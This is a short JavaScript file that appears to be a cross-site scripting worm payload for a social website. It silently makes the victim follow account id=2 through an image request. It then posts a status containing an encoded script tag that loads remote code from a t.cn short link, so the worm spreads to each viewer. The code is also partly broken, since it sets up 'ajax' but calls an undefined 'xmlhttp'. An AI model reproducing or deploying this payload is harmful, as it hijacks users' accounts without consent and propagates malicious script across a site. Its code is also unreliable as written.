var m = new Image();
m.src = document.getElementsByTagName('link')[0].href + "/../../../do/add_guanzhu.php?id=2";
var url = document.getElementsByTagName('link')[0].href + "/../../../do/activity.php";
var post_str = "content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E";
var ajax = null;
if (window.XMLHttpRequest) {
	ajax = new XMLHttpRequest();
}
else if (window.ActiveXObject) {
	ajax = new ActiveXObject("Microsoft.XMLHTTP");
}
else {
	return;
}
xmlhttp.open("POST",url,true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send(post_str);